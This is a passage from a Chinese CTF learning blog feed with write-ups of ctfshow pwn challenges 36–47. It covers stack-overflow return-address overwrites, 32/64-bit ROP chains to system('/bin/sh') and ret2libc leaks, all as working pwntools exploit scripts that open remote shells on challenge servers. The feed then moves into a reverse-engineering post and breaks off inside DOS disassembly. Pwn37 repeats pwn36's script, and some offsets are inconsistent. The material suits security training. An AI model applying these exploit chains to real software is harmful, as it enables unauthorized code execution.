title="pwn36"></a>pwn36</h3><p>gets函数是没有长度限制的，可以发生栈溢出！</p><p>所以我们的大致思路就是通过栈溢出，将ctfshow函数的返回地址覆盖为get_flag函数的地址，这样我们就可以控制程序的执行流程，进而拿到flag。</p><p>首先看ida中s[36]数组的大小为36，加上我们还要覆盖掉ebp的值(ebp后面是返回地址，前面是局部变量s数组的栈空间)，我们需要的填充数据长度就为36 + 4即0x28 + 0x4，我们通过gdb的disass get_flag命令就可以得到get_flag函数的汇编代码，其中就有get_flag函数的首地址，所以我们大致的payload就为：(0x28 + 0x4 ) * ‘a’ + p32(get_flag函数的地址)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;, &quot;28312&quot;)</span><br><span class="line"></span><br><span class="line">offset = 0x12 + 0x4</span><br><span class="line">get_flag_addr = 0x8048521</span><br><span class="line">payload = offset * &#x27;a&#x27; + p32(get_flag_addr)</span><br><span class="line">print(payload)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="pwn37"><a href="#pwn37" class="headerlink" title="pwn37"></a>pwn37</h3><h5 id="32位的-system-“-x2F-bin-x2F-sh”-后门函数给你"><a href="#32位的-system-“-x2F-bin-x2F-sh”-后门函数给你" class="headerlink" title="32位的 system(“&#x2F;bin&#x2F;sh”) 后门函数给你"></a>32位的 system(“&#x2F;bin&#x2F;sh”) 后门函数给你</h5><p>直接改：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;, &quot;28312&quot;)</span><br><span class="line"></span><br><span class="line">offset = 0x12 + 0x4</span><br><span class="line">get_flag_addr = 0x8048521</span><br><span class="line">payload = offset * &#x27;a&#x27; + p32(get_flag_addr)</span><br><span class="line">print(payload)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="pwn38"><a href="#pwn38" class="headerlink" title="pwn38"></a>pwn38</h3><h5 id="改64位"><a href="#改64位" class="headerlink" title="改64位"></a>改64位</h5><p>值得注意的是，这里需要用lea命令的地址作为覆盖的地址，而不是backdoor函数的地址，才疏学浅不知道为什么，可能是修改了栈的值导致出现错误</p><h3 id="pwn39"><a href="#pwn39" class="headerlink" title="pwn39"></a>pwn39</h3><h5 id="32位的-system-“-x2F-bin-x2F-sh”"><a href="#32位的-system-“-x2F-bin-x2F-sh”" class="headerlink" title="32位的 system(); “&#x2F;bin&#x2F;sh”"></a>32位的 system(); “&#x2F;bin&#x2F;sh”</h5><p>但是这里不是system(“&#x2F;bin&#x2F;sh”)了，而是将函数和参数分割，两者都在程序中，所以可以通过栈溢出自行构造完整后门，栈上传参</p><p>自行构造完整后门（调用链）对溢出长度有要求，至少要能溢出除ip以外再多2个机器字长（32位4 bit；64位8bit），用于写入调用步骤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#payload=[填充]+[system@plt]+[4bytes填充]+[参数]</span><br><span class="line">from pwn import *</span><br><span class="line"> </span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;, &quot;28113&quot;)</span><br><span class="line"> </span><br><span class="line">offset = 0x12 + 0x4</span><br><span class="line">system_addr = 0x080483A0</span><br><span class="line">binsh_addr = 0x8048750</span><br><span class="line">payload = offset * b&#x27;a&#x27; + p32(system_addr) + b&#x27;aaaa&#x27; + p32(binsh_addr)</span><br><span class="line"> </span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="pwn40"><a href="#pwn40" class="headerlink" title="pwn40"></a>pwn40</h3><h5 id="64位的-system-“-x2F-bin-x2F-sh”"><a href="#64位的-system-“-x2F-bin-x2F-sh”" class="headerlink" title="64位的 system(); “&#x2F;bin&#x2F;sh”"></a>64位的 system(); “&#x2F;bin&#x2F;sh”</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;,&quot;28227&quot;)</span><br><span class="line"></span><br><span class="line">offset = 0x0A + 0x8</span><br><span class="line">system_addr = 0x602080</span><br><span class="line">binsh_addr = 0x400808</span><br><span class="line">payload = offset*b&#x27;a&#x27; + p64(system_addr)+b&#x27;aaaaaaaa&#x27;+p64(binsh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>本来以为也是改一改就可以的，，但是错了。。</p><h5 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h5><p>这里介绍一下ROPgadget工具，该工具可以绕过NX保护，在栈缓冲区溢出的基础上，利用程序中已有的小片段（gadgets）来改变某些寄存器或者变量的值，从而控制程序的执行流程。所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p><p>64位汇编传参，当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。 当参数为7个以上时，前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。</p><p>有的题，里面既没有现成的system也没有&#x2F;bin&#x2F;sh字符串，也没有提供libc.so给我们，那么我们要做的就是想办法泄露libc地址，拿到system函数和&#x2F;bin&#x2F;sh字符串；我们就需要获取rdi, rsi, rdx, rcx, r8, r9它们的地址，首先要获取的是rdi的地址。这就是 ROPgadget 的作用。</p><p>回到本题，下面利用ROPgadget获得rdi的地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary pwn --only &quot;pop|ret&quot; | grep rdi</span><br></pre></td></tr></table></figure><p>获取ret的地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary pwn</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#payload=[填充]+[pop_rdi_ret]+[参数]+[system@plt]</span><br><span class="line">from pwn import *</span><br><span class="line"> </span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;, &quot;28151&quot;)</span><br><span class="line"> </span><br><span class="line">offset = 0xA + 0x8</span><br><span class="line">ret_addr = 0x00000000004004fe</span><br><span class="line">system_addr = 0x400520</span><br><span class="line">binsh_addr = 0x400808</span><br><span class="line">rdi_addr = 0x00000000004007e3</span><br><span class="line">payload = offset * b&#x27;a&#x27; + p64(rdi_addr) + p64(binsh_addr)  + p64(ret_addr) + p64(system_addr)</span><br><span class="line">#这里ret_addr的作用是作为一个8字节的间接跳转指令，用于绕过栈中的返回地址，以达到执行system函数的目的</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>1.pwn36-pwn38：完整后门&amp;溢出长度大于等于ip。只要我们调用这个后门函数，不需要其他额外的操作就能getshell，通常是system(‘&#x2F;bin&#x2F;sh’)，write(1,’flag’,32)等形式。</p><p>payload &#x3D; [填充] + [get_shell_addr]</p><p>2.pwn39、wn40：残缺后门&amp;溢出长度远大于ip。这里指的远大于ip，意思是可以溢出覆盖除了ip以外的2个以上的（一般情况，实际情况实际分析）机器字长。残缺后门的形式多种多样：提供诸如system等关键函数，flag、&#x2F;bin&#x2F;sh等字符串，某些gadget等。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload=[填充]+[system@plt]+[4bit填充]+[参数]  #32位</span><br><span class="line">payload=[填充]+[pop_rdi_ret]+[参数]+[system@plt]  #64位</span><br></pre></td></tr></table></figure><p>原文链接：<a href="https://blog.csdn.net/weixin_63576152/article/details/132437169">https://blog.csdn.net/weixin_63576152/article/details/132437169</a></p><h3 id="pwn41"><a href="#pwn41" class="headerlink" title="pwn41"></a>pwn41</h3><h5 id="32位的-system-但是没”-x2F-bin-x2F-sh”-，好像有其他的可以替代"><a href="#32位的-system-但是没”-x2F-bin-x2F-sh”-，好像有其他的可以替代" class="headerlink" title="32位的 system(); 但是没”&#x2F;bin&#x2F;sh”  ，好像有其他的可以替代"></a>32位的 system(); 但是没”&#x2F;bin&#x2F;sh”  ，好像有其他的可以替代</h5><p>这里先介绍一下&#x2F;bin&#x2F;sh和&#x2F;sh的区别：</p><p>system(“&#x2F;bin&#x2F;sh”) 是直接指定了系统默认的shell程序路径来执行命令，这种方式可以确保使用系统默认的shell程序执行命令，因为 &#x2F;bin&#x2F;sh 链接通常指向默认shell的可执行文件。 system(“sh”) 则会直接启动一个名为sh的shell程序，依赖系统的环境变量 $PATH 来查找 sh 可执行文件并执行。如果系统的环境变量设置正确，这两种方式是等效的；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"> </span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;,&#x27;28297&#x27;)</span><br><span class="line"> </span><br><span class="line">offset = 0x12 + 0x4</span><br><span class="line">system = 0x80483D0</span><br><span class="line">sh = 0x80487BA</span><br><span class="line">payload = offset * b&#x27;a&#x27; + p32(system) + b&#x27;aaaa&#x27; + p32(sh)</span><br><span class="line"> </span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="pwn42"><a href="#pwn42" class="headerlink" title="pwn42"></a>pwn42</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"> </span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;,&#x27;28235&#x27;)</span><br><span class="line"> </span><br><span class="line">offset = 0x0A + 0x8</span><br><span class="line">system_addr = 0x400560</span><br><span class="line">sh_addr = 0x400872</span><br><span class="line">rdi_addr = 0x400843</span><br><span class="line">ret_addr = 0x40053e</span><br><span class="line">payload = offset * b&#x27;a&#x27; + p64(rdi_addr) + p64(sh_addr) + p64(ret_addr) + p64(system_addr)</span><br><span class="line"> </span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="pwn43"><a href="#pwn43" class="headerlink" title="pwn43"></a>pwn43</h3><h5 id="32位的-system-但是好像没”-x2F-bin-x2F-sh”-上面的办法不行了，想想办法"><a href="#32位的-system-但是好像没”-x2F-bin-x2F-sh”-上面的办法不行了，想想办法" class="headerlink" title="32位的 system(); 但是好像没”&#x2F;bin&#x2F;sh”  上面的办法不行了，想想办法"></a>32位的 system(); 但是好像没”&#x2F;bin&#x2F;sh”  上面的办法不行了，想想办法</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">payload = [填充] + p32(gets) + p32(pop_ebx) + p32(buf2) + p32(system_addr) + [4bytes填充] +p32(buf2)</span><br><span class="line">#1.填充后溢出，执行gets函数，接收数据</span><br><span class="line">#2.将数据从栈中弹出存入寄存器ebx中</span><br><span class="line">#3.再用缓冲区指针buf2指向寄存器ebx的数据</span><br><span class="line">#4.调用system函数，参数为buf2所指数据，即gets接收的数据</span><br><span class="line">from pwn import *</span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;,&#x27;28280&#x27;)</span><br><span class="line"> </span><br><span class="line">offset = 0x6c + 4</span><br><span class="line">system_addr = 0x8048450</span><br><span class="line">buf2 = 0x804B060</span><br><span class="line">gets = 0x8048420</span><br><span class="line">pop_ebx = 0x08048409</span><br><span class="line">payload = offset * b&#x27;a&#x27; + p32(gets) + p32(pop_ebx) + p32(buf2) + p32(system_addr) + b&#x27;aaaa&#x27; +p32(buf2)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(&quot;/bin/sh&quot;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="pwn44"><a href="#pwn44" class="headerlink" title="pwn44"></a>pwn44</h3><p>64位的 system(); 但是好像没”&#x2F;bin&#x2F;sh”  上面的办法不行了，想想办法</p><p>和上题一样，区别就是64位没有ebx寄存器，还需要用rdi代替，先找到地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;,&#x27;28209&#x27;)</span><br><span class="line"> </span><br><span class="line">offset = 0xA + 8</span><br><span class="line">system_addr = 0x400520</span><br><span class="line">buf2 = 0x602080</span><br><span class="line">gets = 0x400530</span><br><span class="line">pop_rdi = 0x4007f3</span><br><span class="line">payload = offset * b&#x27;a&#x27; + p64(pop_rdi) + p64(buf2) + p64(gets) + p64(pop_rdi) + p64(buf2) + p64(system_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(&quot;/bin/sh&quot;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>1.利用 pop_rdi 指令将 buf2 的地址加载到rdi寄存器中，因为在调用gets函数之前，你需要将输入的缓冲区的地址（即buf2的地址）传递给gets函数，以便gets函数知道将输入数据存储在哪个缓冲区中 2.调用 gets 函数，以 buf2 的地址作为参数，从用户输入中读取数据，并将其存储在buf2中 3.再次利用 pop_rdi 指令将 buf2 的地址加载到rdi 寄存器中 4.调用 system 函数，以 buf2 的地址作为参数</p><h3 id="pwn45"><a href="#pwn45" class="headerlink" title="pwn45"></a>pwn45</h3><h5 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h5><p>..。。打了一天没大通。算料。。</p><p>呃呃打通了。。。。（五分钟后觉得有问题。。</p><p>#正解</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#right</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;, &quot;28187&quot;)</span><br><span class="line">elf = ELF(&quot;./pwn&quot;)</span><br><span class="line">offset = 0x6B + 0x4</span><br><span class="line">main_addr = elf.symbols[&#x27;main&#x27;]</span><br><span class="line">write_plt = elf.plt[&#x27;write&#x27;]</span><br><span class="line">write_got = elf.got[&#x27;write&#x27;]</span><br><span class="line">payload = offset * b&#x27;a&#x27; + p32(write_plt) + p32(main_addr) + p32(0) + p32(write_got)+ p32(4)</span><br><span class="line">p.recvuntil(&#x27;O.o?&#x27;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_addr = u32(p.recvuntil(&#x27;\xf7&#x27;)[-4:])</span><br><span class="line">libc = LibcSearcher(&quot;write&quot;, write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(&quot;write&quot;)</span><br><span class="line">system_addr = libc_base + libc.dump(&quot;system&quot;)</span><br><span class="line">binsh_addr = libc_base + libc.dump(&quot;str_bin_sh&quot;)</span><br><span class="line"></span><br><span class="line">payload = offset * b&#x27;a&#x27; + p32(system_addr) + b&#x27;aaaa&#x27; + p32(binsh_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="pwn46"><a href="#pwn46" class="headerlink" title="pwn46"></a>pwn46</h3><p>？神奇，得先</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">checksec pwn</span><br><span class="line">readelf -s pwn</span><br><span class="line">objdump -R pwn</span><br></pre></td></tr></table></figure><p>溜一遍？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28141)</span><br><span class="line">elf = ELF(&#x27;./pwn&#x27;)</span><br><span class="line">write_plt = elf.plt[&#x27;write&#x27;]</span><br><span class="line">write_got = elf.got[&#x27;write&#x27;]</span><br><span class="line">main = elf.sym[&#x27;main&#x27;]</span><br><span class="line">pop_rdi = 0x400803         </span><br><span class="line">pop_rsi_r15 = 0x400801     </span><br><span class="line"></span><br><span class="line">payload  = cyclic(0x70+8) + p64(pop_rdi) + p64(1)</span><br><span class="line">payload += p64(pop_rsi_r15) + p64(write_got) + p64(0)</span><br><span class="line">payload += p64(write_plt)</span><br><span class="line">payload += p64(main)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(&quot;O.o?&quot;,payload)</span><br><span class="line">write = u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,&#x27;\x00&#x27;))</span><br><span class="line">print hex(write)</span><br><span class="line">libc = LibcSearcher(&#x27;write&#x27;,write)</span><br><span class="line">libc_base = write - libc.dump(&#x27;write&#x27;)</span><br><span class="line">system = libc_base + libc.dump(&#x27;system&#x27;)</span><br><span class="line">bin_sh = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line">payload = cyclic(0x70+8) + p64(pop_rdi) + p64(bin_sh) + p64(system)</span><br><span class="line">io.sendlineafter(&quot;O.o?&quot;,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>。。</p><h2 id="ret2libc-1"><a href="#ret2libc-1" class="headerlink" title="ret2libc"></a>ret2libc</h2><h3 id="pwn47"><a href="#pwn47" class="headerlink" title="pwn47"></a>pwn47</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"> from LibcSearcher import *</span><br><span class="line"> context(arch = &#x27;i386&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br><span class="line"> #io = process(&#x27;./pwn&#x27;)</span><br><span class="line"> io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28200)</span><br><span class="line"> elf = ELF(&#x27;./pwn&#x27;)</span><br><span class="line"> io.recvuntil(&quot;puts: &quot;)</span><br><span class="line"> puts = eval(io.recvuntil(&quot;\n&quot; , drop = True))</span><br><span class="line"> io.recvuntil(&quot;gift: &quot;)</span><br><span class="line"> bin_sh = eval(io.recvuntil(&quot;\n&quot; , drop = True))</span><br><span class="line"> libc = LibcSearcher(&quot;puts&quot; , puts)</span><br><span class="line"> libc_base = puts - libc.dump(&quot;puts&quot;)</span><br><span class="line"> system = libc_base + libc.dump(&quot;system&quot;)</span><br><span class="line"> paylad = &quot;a&quot;*(0x9c+4) + p32(system) + p32(0) + p32(bin_sh)</span><br><span class="line"> io.sendline(paylad)</span><br><span class="line"> io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;PWN-study&quot;&gt;&lt;a href=&quot;#PWN-study&quot; class=&quot;headerlink&quot; title=&quot;PWN-study&quot;&gt;&lt;/a&gt;PWN-study&lt;/h1&gt;&lt;h3 id=&quot;pwn0&quot;&gt;&lt;a href=&quot;#pwn0&quot; class=&quot;headerli</summary>
      
    
    
    
    
    <category term="CTF PWN" scheme="https://github.com/xyy9233/xyy9233.github.io.git/tags/CTF-PWN/"/>
    
  </entry>
  
  <entry>
    <title>Re百题计划（</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/05/04/Re%E7%99%BE%E9%A2%98%E8%AE%A1%E5%88%92%EF%BC%88/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/05/04/Re%E7%99%BE%E9%A2%98%E8%AE%A1%E5%88%92%EF%BC%88/</id>
    <published>2024-05-03T16:00:00.000Z</published>
    <updated>2024-09-16T07:58:26.586Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Re百题计划（"><a href="#Re百题计划（" class="headerlink" title="Re百题计划（"></a>Re百题计划（</h1><h2 id="1-你是真的大学生吗？"><a href="#1-你是真的大学生吗？" class="headerlink" title="1.你是真的大学生吗？"></a>1.你是真的大学生吗？</h2><h5 id="硬读汇编"><a href="#硬读汇编" class="headerlink" title="硬读汇编"></a>硬读汇编</h5><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">start           proc near</span><br><span class="line">seg001:<span class="number">0000</span>                 mov     ax, seg dseg</span><br><span class="line">seg001:<span class="number">0003</span>                 mov     ds, ax</span><br><span class="line">seg001:<span class="number">0005</span>                 assume ds:dseg</span><br><span class="line">seg001:<span class="number">0005</span>                 lea     dx, unk_10000</span><br><span class="line">seg001:<span class="number">0009</span>                 mov     ah, <span class="number">9</span></span><br><span class="line">seg001:<span class="number">000</span>B                 int     <span class="number">21</span>h             ; DOS - PRINT STRING</span><br><span class="line">seg001:<span class="number">000</span>B                                         ; DS:DX <span class="punctuation">-&gt;</span> string terminated by <span class="string">&quot;$&quot;</span></span><br><span class="line">seg001:<span class="number">000</span>D                 lea     dx, unk_1002D</span><br><span class="line">seg001:<span class="number">0011</span>                 mov     ah, <span class="number">0</span>Ah</span><br><span class="line">seg001:<span class="number">0013</span>                 int     <span class="number">21</span>h             ; DOS - BUFFERED KEYBOARD INPUT</span><br><span class="line">seg001:<span class="number">0013</span>                                         ; DS:DX <span class="punctuation">-&gt;</span> buffer</span><br><span class="line">seg001:<span class="number">0015</span>                 lea     dx, unk_10010</span><br><span class="line">seg001:<span class="number">0019</span>                 mov     ah, <span class="number">9</span></span><br><span class="line">seg001:<span class="number">001</span>B                 int     <span class="number">21</span>h             ; DOS - PRINT STRING</span><br><span class="line">seg001:<span class="number">001</span>B                                         ; DS:DX <span class="punctuation">-&gt;</span> string terminated by <span class="string">&quot;$&quot;</span></span><br><span class="line">seg001:<span class="number">001</span>D                 xor     cx, cx</span><br><span class="line">seg001:<span class="number">001</span>F                 xor     ax, ax</span><br><span class="line">seg001:<span class="number">0021</span>                 mov     cl, byte_1002E</span><br><span class="line">seg001:<span class="number">0025</span>                 mov     si, <span class="number">2</span>Fh ; <span class="string">&#x27;/&#x27;</span></span><br><span class="line">seg001:<span class="number">0028</span>                 mov     al, [si]</span><br><span class="line">seg001:<span class="number">002</span>A                 add     si, cx</span><br><span class="line">seg001:<span class="number">002</span>C</span><br><span class="line">seg001:<span class="number">002</span>C loc_1007C:                              ; CODE XREF: start+<span class="number">37</span>↓j</span><br><span class="line">seg001:<span class="number">002</span>C                 sub     si, <span class="number">1</span></span><br><span class="line">seg001:<span class="number">002</span>F                 xor     [si], al</span><br><span class="line">seg001:<span class="number">0031</span>                 mov     al, [si]</span><br><span class="line">seg001:<span class="number">0033</span>                 dec     cx</span><br><span class="line">seg001:<span class="number">0034</span>                 cmp     cx, <span class="number">0</span></span><br><span class="line">seg001:<span class="number">0037</span>                 jnz     short loc_1007C</span><br><span class="line">seg001:<span class="number">0039</span>                 lea     si, unk_1002F</span><br><span class="line">seg001:<span class="number">003</span>D                 lea     di, unk_10019<span class="comment">///////</span></span><br><span class="line">seg001:<span class="number">0041</span></span><br><span class="line">seg001:<span class="number">0041</span> loc_10091:                              ; CODE XREF: start+<span class="number">50</span>↓j</span><br><span class="line">seg001:<span class="number">0041</span>                 mov     al, [si]</span><br><span class="line">seg001:<span class="number">0043</span>                 mov     bl, [di]</span><br><span class="line">seg001:<span class="number">0045</span>                 add     si, <span class="number">1</span></span><br><span class="line">seg001:<span class="number">0048</span>                 inc     di</span><br><span class="line">seg001:<span class="number">0049</span>                 cmp     al, bl</span><br><span class="line">seg001:<span class="number">004</span>B                 jnz     short loc_100AA</span><br><span class="line">seg001:<span class="number">004</span>D                 cmp     cx, <span class="number">0</span></span><br><span class="line">seg001:<span class="number">0050</span>                 jnz     short loc_10091</span><br><span class="line">seg001:<span class="number">0052</span>                 lea     dx, unk_10013</span><br><span class="line">seg001:<span class="number">0056</span>                 mov     ah, <span class="number">9</span></span><br><span class="line">seg001:<span class="number">0058</span>                 int     <span class="number">21</span>h             ; DOS - PRINT STRING</span><br><span class="line">seg001:<span class="number">0058</span>                                         ; DS:DX <span class="punctuation">-&gt;</span> string terminated by <span class="string">&quot;$&quot;</span></span><br><span class="line">seg001:<span class="number">005</span>A</span><br><span class="line">seg001:<span class="number">005</span>A loc_100AA:                              ; CODE XREF: start+<span class="number">4</span>B↑j</span><br><span class="line">seg001:<span class="number">005</span>A                 mov     ah, 